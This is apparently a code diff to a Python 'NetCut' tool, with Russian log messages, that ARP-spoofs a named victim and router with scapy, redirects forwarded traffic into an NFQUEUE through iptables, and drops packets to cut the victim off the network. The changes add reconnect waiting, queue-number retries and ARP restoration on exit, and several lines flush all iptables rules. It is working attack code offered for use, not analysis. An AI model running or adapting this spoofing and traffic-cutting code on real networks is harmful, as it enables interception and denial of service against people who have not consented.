@@ -3,14 +3,18 @@ import scapy.all as scapy
 import subprocess
 from time import sleep
 from queue import Queue
+import sys
 
 
 class NetCut:
-    def __init__(self, white_ip, victim, router):
+    def __init__(self, white_ip, victim, router, is_waiting):
         self.white_ip = white_ip
         self.victim = victim
         self.router = router
         self.q = Queue()
+        self.is_waiting = is_waiting
+
+        self.is_exit = False
 
     ############ ARP SPOOF ################
     def linux_iproute(self, meaning):
@@ -28,7 +32,17 @@ class NetCut:
                 ans = scapy.srp(pkt, verbose=False, timeout=1)[0]
                 return ans[0][1].hwsrc
             except:
-                continue
+                if self.is_waiting:
+                    print("[-] Жертва вышла из сети... Ожидаем подключения....")
+                else:
+                    print("[-] Жертва вышла из сети")
+                    print("[-] Нажмите Ctrl+C, чтобы выйти...")
+
+                    self.q.put_nowait("stop")
+
+                    self.is_exit = True
+
+                    break
 
     def send_packet(self, target, target_spoof):
         target_mac = self.get_mac(target)
@@ -61,18 +75,32 @@ class NetCut:
             packet.accept()
 
     def queue_run(self):
-        subprocess.Popen("iptables -A FORWARD -j NFQUEUE --queue-num 2", shell=True)
+        self.queue = NetfilterQueue()
 
-        queue = NetfilterQueue()
-        queue.bind(2, self.net_cut)
+        queue_num = 2
+        while True: 
+            try:
+                subprocess.Popen("iptables -F", shell=True)
+                subprocess.Popen("iptables -A FORWARD -j NFQUEUE --queue-num " + str(queue_num ), shell=True)
+                self.queue.bind(queue_num, self.net_cut)
+                break
+            except Exception as ex:
+                print(ex)
+                queue_num  = int(input(f"Netfilterqueue не смог создать очередь с номером {str(queue_num )}, перезагрузитесь или выберете номер очереди самостоятельно: "))
+
         try:
-            queue.run()
-        except KeyboardInterrupt:
-            self.q.put_nowait("stop")
+            self.queue.run()
+        except:
+            if not self.is_exit:
+                print("[*] Восстанавливю")
+                self.q.put_nowait("stop")
 
-            self.restore(self.victim, self.router)
-            self.restore(self.router, self.victim)
-            
+                self.restore(self.victim, self.router)
+                self.restore(self.router, self.victim)
+                
+                print("[+] Восстановление завершено")
+            else:
+                print("[*] Выходим....")
+
             self.linux_iproute(0)
-
             subprocess.Popen("iptables -F", shell=True)
